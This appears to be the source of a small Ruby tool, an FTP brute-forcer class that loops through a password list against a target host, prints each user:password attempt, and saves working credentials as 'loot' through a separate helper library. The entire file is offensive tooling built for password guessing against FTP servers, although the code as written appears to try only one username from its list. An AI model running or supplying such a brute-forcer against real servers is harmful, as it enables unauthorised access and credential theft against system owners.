require 'net/ftp'
require 'lib/lootwrite.rb'


class FTPBrute
  def initialize host, passwords, users
    @host, @passwords, @users = host, passwords, users
    @ftp = Net::FTP.new(host)
    user_rotation
  end
  def user_pop
    if @users.length > 0
      a = @users.pop(1)
      return a[0]
    else
      puts "no valid users found"
      return false
    end
  end
  def user_rotation
    a = staging user_pop
    if a === false
      return
    elsif a === true
      return
    end
  end
  def staging user
    if user === false
      puts "no valid user/password combination found"
      return false
    end
    @passwords.each do |password|
      print "attempting #{user}:#{password}"
      if ftp_login user, password
        puts "\nvalid combination found: #{user}:#{password}"
        WriteLoot.new(@host, "ftp", user, password)
        return
      end
    end
  end
  def ftp_login user, password
    begin
      @ftp.login(user, password)
    rescue Exception => e
      @ftp = Net::FTP.new(@host)
      false
    end
  end
end
